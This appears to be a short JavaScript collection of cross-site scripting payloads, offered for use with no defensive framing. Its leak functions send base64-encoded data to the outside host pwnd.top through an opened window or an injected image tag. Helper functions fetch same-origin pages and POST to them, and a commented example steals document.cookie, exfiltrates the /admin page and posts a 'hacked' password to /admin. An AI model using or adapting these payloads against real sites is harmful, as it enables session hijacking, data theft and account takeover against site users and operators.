/*
 *  XSS Payload Examples
*/
// exfil data
function leak2(data) {
    window.open("http://pwnd.top/"+btoa(data));
}
function leak(data) {
    document.write('<img src="http://pwnd.top/'+btoa(data)+'">');
}

// get same origin page contents and exfil
// DEPRECATED - USE FETCH
function getPageAJAX(page) {
	ajax = new XMLHttpRequest();
	ajax.open("GET", page, true);
	ajax.onreadystatechange = function () {
		if (ajax.readyState == 4 ) {
			var src = ajax.responseText;
			leak(src);
        	}
    }
	ajax.send();
}

// get page via fetch (full url or local page)
function getPageFetch(url) {
	return fetch(url, {
        method: "GET",
        headers: {
          "Referrer": "/profile"
        },
	mode: "no-cors",
    }).then(resp => resp.text())
        .then(function(resp) {
            return unescape(encodeURIComponent(resp));
        })
}

// post via fetch
function postPageFetch(url, data) {
	fetch(url, {
        method: "POST",
        body: data,
        //body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json"
        },
    }).then(resp => resp.text())
        .then(function(resp) {
            return unescape(encodeURIComponent(resp));
        })
}

// Examples
/*
async function run() {
    leak(document.cookie);
    leak(await getPageFetch('/admin'));
    leak( await postPageFetch('/admin', '["password":"hacked"]'));
}
run();
*/
